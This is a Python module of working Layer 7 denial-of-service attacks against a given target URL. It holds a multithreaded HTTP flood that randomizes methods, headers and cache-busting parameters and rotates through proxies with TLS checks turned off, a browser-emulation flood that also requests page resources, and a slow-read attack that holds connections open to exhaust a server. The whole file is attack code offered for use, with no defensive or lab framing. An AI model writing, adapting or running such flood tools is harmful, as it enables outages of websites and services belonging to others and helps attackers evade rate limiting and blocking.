#!/usr/bin/env python3
"""
Advanced Layer 7 HTTP Attacks Module
"""

import random
import time
import threading
import uuid
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


class AdvancedLayer7Attacks:
    """Advanced Layer 7 HTTP Attack Methods"""
    
    def __init__(self, target_url, proxy_list=None):
        self.target_url = target_url
        self.proxy_list = proxy_list or []
        self.active = True
        self.session = requests.Session()
        self.requests_sent = 0
        self.successful_requests = 0
        self.failed_requests = 0
        
        # User agents for realistic requests
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0'
        ]
        
        # Configure session
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
    def http_flood_advanced(self, duration=60, threads=100):
        """Advanced HTTP Flood with multiple techniques"""
        print(f"🚀 Starting Advanced HTTP Flood on {self.target_url}")
        
        def send_requests():
            while self.active:
                try:
                    # Random request method
                    method = random.choice(['GET', 'POST', 'HEAD', 'OPTIONS'])
                    
                    # Random headers
                    headers = {
                        'User-Agent': random.choice(self.user_agents),
                        'Accept': random.choice([
                            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'application/json,text/plain,*/*',
                            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
                        ]),
                        'Accept-Language': random.choice([
                            'en-US,en;q=0.9',
                            'en-GB,en;q=0.8',
                            'tr-TR,tr;q=0.9,en;q=0.8'
                        ]),
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Connection': 'keep-alive',
                        'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store']),
                        'Pragma': 'no-cache',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'none',
                        'Upgrade-Insecure-Requests': '1'
                    }
                    
                    # Random parameters
                    params = {
                        'q': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(5, 20))),
                        'page': random.randint(1, 100),
                        'limit': random.randint(10, 100),
                        'sort': random.choice(['date', 'name', 'size', 'relevance']),
                        'filter': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3, 10))),
                        'timestamp': int(time.time()),
                        'random': uuid.uuid4().hex[:8]
                    }
                    
                    # Use proxy if available
                    proxy = None
                    if self.proxy_list:
                        proxy_addr = random.choice(self.proxy_list)
                        proxy = {
                            'http': f'http://{proxy_addr}',
                            'https': f'http://{proxy_addr}'
                        }
                    
                    # Send request
                    if method == 'GET':
                        response = self.session.get(
                            self.target_url, 
                            headers=headers, 
                            params=params,
                            proxies=proxy,
                            timeout=10,
                            verify=False
                        )
                    elif method == 'POST':
                        data = {k: v for k, v in params.items()}
                        response = self.session.post(
                            self.target_url,
                            headers=headers,
                            data=data,
                            proxies=proxy,
                            timeout=10,
                            verify=False
                        )
                    elif method == 'HEAD':
                        response = self.session.head(
                            self.target_url,
                            headers=headers,
                            proxies=proxy,
                            timeout=10,
                            verify=False
                        )
                    else:  # OPTIONS
                        response = self.session.options(
                            self.target_url,
                            headers=headers,
                            proxies=proxy,
                            timeout=10,
                            verify=False
                        )
                    
                    self.requests_sent += 1
                    if response.status_code < 400:
                        self.successful_requests += 1
                    else:
                        self.failed_requests += 1
                        
                except Exception:
                    self.failed_requests += 1
                    
        # Start threads
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=send_requests)
            t.daemon = True
            t.start()
            threads_list.append(t)
            
        # Run for duration
        time.sleep(duration)
        self.active = False
        
        print(f"📊 Advanced HTTP Flood completed")
        print(f"📤 Requests sent: {self.requests_sent}")
        print(f"✅ Successful: {self.successful_requests}")
        print(f"❌ Failed: {self.failed_requests}")
        
    def browser_emulation_attack(self, duration=60, threads=50):
        """Browser emulation attack with realistic behavior"""
        print(f"🌐 Starting Browser Emulation Attack on {self.target_url}")
        
        def browser_worker():
            while self.active:
                try:
                    headers = {
                        'User-Agent': random.choice(self.user_agents),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1',
                        'DNT': '1',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate'
                    }

                    # Simulate browser behavior with multiple requests
                    for _ in range(random.randint(3, 8)):
                        try:
                            response = self.session.get(self.target_url, headers=headers, timeout=10)
                            if response.status_code == 200:
                                self.successful_requests += 1
                                
                                # Simulate loading additional resources
                                for resource in ['style.css', 'script.js', 'favicon.ico']:
                                    try:
                                        resource_url = f"{self.target_url.rstrip('/')}/{resource}"
                                        self.session.get(resource_url, headers=headers, timeout=5)
                                    except:
                                        pass
                            else:
                                self.failed_requests += 1
                                
                        except Exception:
                            self.failed_requests += 1
                            
                        # Random delay between requests
                        time.sleep(random.uniform(0.1, 0.5))
                        
                except Exception:
                    self.failed_requests += 1
                    
        # Start threads
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=browser_worker)
            t.daemon = True
            t.start()
            threads_list.append(t)
            
        # Run for duration
        time.sleep(duration)
        self.active = False
        
        print(f"📊 Browser Emulation Attack completed")
        print(f"📤 Requests sent: {self.requests_sent}")
        print(f"✅ Successful: {self.successful_requests}")
        print(f"❌ Failed: {self.failed_requests}")

    def slowread_attack(self, duration=60, connections=100):
        """Slowread attack - reads response very slowly to exhaust server resources"""
        print(f"🐌 Starting Slowread attack on {self.target_url}")
        
        def slow_read_worker():
            try:
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive'
                }
                
                response = self.session.get(self.target_url, headers=headers, stream=True, timeout=30)
                
                # Read response very slowly
                for chunk in response.iter_content(chunk_size=1):
                    if not self.active:
                        break
                    time.sleep(0.1)  # Slow read
                    
                self.successful_requests += 1
                    
            except Exception:
                self.failed_requests += 1
                
        # Start connections
        threads_list = []
        for _ in range(connections):
            t = threading.Thread(target=slow_read_worker)
            t.daemon = True
            t.start()
            threads_list.append(t)
            
        # Run for duration
        time.sleep(duration)
        self.active = False
        
        print(f"📊 Slowread attack completed")
        print(f"✅ Successful: {self.successful_requests}")
        print(f"❌ Failed: {self.failed_requests}")
        
    def stop_attack(self):
        """Stop all active attacks"""
        self.active = False